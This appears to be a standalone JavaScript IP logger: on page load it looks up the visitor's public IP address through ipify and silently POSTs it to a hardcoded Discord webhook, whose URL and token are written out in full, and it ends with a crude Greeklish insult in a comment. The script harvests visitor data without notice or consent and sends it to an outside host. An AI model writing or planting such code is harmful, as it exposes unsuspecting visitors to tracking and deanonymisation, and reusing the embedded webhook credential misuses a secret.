window.addEventListener('load', function() {
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        sendToDiscordWebhook(data.ip);
      })
      .catch(error => {
        console.error(error);
      });
  
    function sendToDiscordWebhook(ip) {
      var webhookURL = 'https://discord.com/api/webhooks/1113803195672694864/pxmy0jo75OrUY0nbmMzi3m1W3x3GkaL6_Mb28EPGGAyNyoh52xbs46d15Ql4dqAOt9Hs'; 
  
      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          content: 'IP: ' + ip
        })
      })
      .then(() => console.log('IP sent to Discord webhook.'))
      .catch(error => console.error('Error sending IP to Discord webhook:', error));
    }
  });
  // se gamane mabroi kai sou aresh poytans ge
